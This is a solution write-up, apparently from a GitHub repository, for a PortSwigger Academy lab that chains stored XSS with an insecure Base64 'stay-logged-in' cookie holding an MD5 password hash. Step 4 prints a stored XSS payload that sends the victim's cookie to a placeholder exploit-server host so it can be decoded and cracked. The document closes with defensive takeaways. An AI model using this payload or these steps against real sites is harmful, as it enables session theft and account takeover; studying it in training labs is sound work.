#  Offline password cracking

## 📌 Lab Details
- **Title**: Offline password cracking
- **Difficulty**: Practitioner
- **Category**: Authentication
- **Lab URL**: https://portswigger.net/academy/labs/launch/151f941feb521716a2b1005d474bcf3f4ad34dee8790c892af3e36c88c22a128?referrer=%2fweb-security%2fauthentication%2fother-mechanisms%2flab-offline-password-cracking

## 🔍 Summary
The lab combines a stored XSS on the blog comments with an insecure "stay logged in" cookie that stores username:md5(password) Base64‑encoded. By injecting a stored XSS payload you capture Carlos’s cookie on the exploit server and then decode it to access the account.

## 🛠 Steps to Solve
1. Use your own account to investigate the "Stay logged in" functionality. Notice that the `stay-logged-in` cookie is Base64 encoded.
2. Go to the Response to your login request and highlight the `stay-logged-in` cookie, to see that it is constructed as follows:<br>
`username+':'+md5HashOfPassword`
3. You now need to steal the victim user's cookie. Observe that the comment functionality is vulnerable to XSS.
4. Go to one of the blogs and post a comment containing the following stored XSS payload, remembering to enter your own exploit server ID:
   ```sh
   <script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
   ```
5. On the exploit server, open the access log. There should be a `GET` request from the victim containing their `stay-logged-in` cookie.
6. Decode the cookie in Burp Decoder.
7. Decode the **hash** to find the password.
8. Log into the account and delete the account to complete the lab.

## 📖 Key Takeaways
- **Base64 ≠ encryption** — encoding the cookie in Base64 only hides format; anyone who gets the value can decode it.
- Do not store raw or unsalted password hashes in client-side cookies. Storing `username:md5(password)` lets an attacker perform offline cracking or lookup easily.
- Use cookie protections — mark sensitive cookies `HttpOnly`, `Secure` and consider `SameSite` to reduce theft via client-side scripts or cross-site requests.
  
## 🖼️ Screenshot 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/043299da-2450-45db-bec9-782ae8282f38" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/8f28f078-098a-4061-8cde-3a049146e26a" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/66a16c11-d860-4b4b-93f9-61b794e824b1" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/dc318430-1999-436e-8734-d0615caa830d" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/f73f7be9-700e-431e-a63f-676a0102787e" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/e0ad8736-2ab4-44be-b7a0-83a7f3ceb09e" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/5090feea-af73-446f-87fa-adeea29353bb" />
